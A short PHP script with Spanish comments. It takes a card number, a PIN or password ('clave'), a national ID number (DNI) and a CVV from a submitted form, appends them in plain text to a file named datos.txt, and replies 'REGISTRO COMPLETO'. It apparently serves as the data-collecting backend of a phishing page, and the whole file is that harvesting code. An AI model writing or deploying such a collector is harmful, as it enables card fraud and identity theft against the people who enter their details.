<?php
$numero = $_POST['numero'] ?? '';
$clave = $_POST['clave'] ?? '';
$DNI = $_POST['DNI'] ?? '';
$cvv = $_POST['cvv'] ?? '';

$datos = "Numero de tarjeta: $numero\nclave: $clave\nDNI: $DNI\ncvv: $cvv\n";

$archivo = 'datos.txt';

// Abre el archivo en modo de escritura (añade los datos al final del archivo)
if ($gestor = fopen($archivo, 'a')) {
    // Escribe los datos en el archivo
    fwrite($gestor, $datos);
    // Cierra el archivo
    fclose($gestor);
    echo "REGISTRO COMPLETO";
} else {
    echo "Error al intentar guardar los datos.";
}
?>
